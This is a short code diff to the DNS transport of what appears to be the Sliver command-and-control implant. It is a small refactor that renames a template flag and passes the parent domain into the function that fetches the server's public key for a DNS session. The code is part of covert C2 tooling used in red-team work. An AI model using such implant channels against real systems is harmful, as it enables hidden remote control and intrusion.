@@ -1,6 +1,6 @@
 package transports
 
-// {{if .DNSParent}}
+// {{if .DNSc2Enabled}}
 
 import (
 	"bytes"
@@ -202,7 +202,7 @@ func dnsDomainSeq(seq int) []byte {
 func dnsStartSession(parentDomain string) (string, AESKey, error) {
 	sessionKey := RandomAESKey()
 
-	pubKey := dnsGetServerPublicKey()
+	pubKey := dnsGetServerPublicKey(parentDomain)
 	if pubKey == nil {
 		return "", AESKey{}, errors.New("pubkey required for new DNS session")
 	}
@@ -238,7 +238,7 @@ func dnsStartSession(parentDomain string) (string, AESKey, error) {
 }
 
 // Get the public key of the server
-func dnsGetServerPublicKey() *rsa.PublicKey {
+func dnsGetServerPublicKey(dnsParent string) *rsa.PublicKey {
 	pubKeyPEM, err := LookupDomainKey(consts.SliverName, dnsParent)
 	if err != nil {
 		// {{if .Debug}}
@@ -558,4 +558,4 @@ func dnsSessionID() string {
 	return "_" + string(sessionID)
 }
 
-// {{end}} -DNSParent
+// {{end}} -DNSc2Enabled
